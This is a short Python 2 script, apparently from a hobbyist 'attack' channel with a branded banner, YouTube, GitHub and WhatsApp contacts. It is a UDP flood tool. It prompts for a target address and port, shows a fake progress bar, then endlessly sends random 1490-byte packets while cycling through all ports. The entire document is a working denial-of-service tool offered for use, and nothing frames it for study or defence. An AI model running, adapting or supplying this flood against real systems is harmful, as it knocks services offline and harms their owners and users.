import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("ELMORSY-ATTACK")
print
print "TAME/:AS7AB ELMGRA"
print "You Tube :https://youtube.com/channel/UCYfOkVH3HQ9vtnuw_hqPFsg "
print "github   : https://github.com/AS7ABELMGRA"
print "whats App/:+201021597142"
print
ip = raw_input("حط رابط الموقع يسطا : ")
port = input("Port       : ")

os.system("clear")
os.system("ELMORSY-ATTACK Starting")
print "[                    ] 0% "
time.sleep(5)
print "[=====               ] 25%"
time.sleep(5)
print "[==========          ] 50%"
time.sleep(5)
print "[===============     ] 75%"
time.sleep(5)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
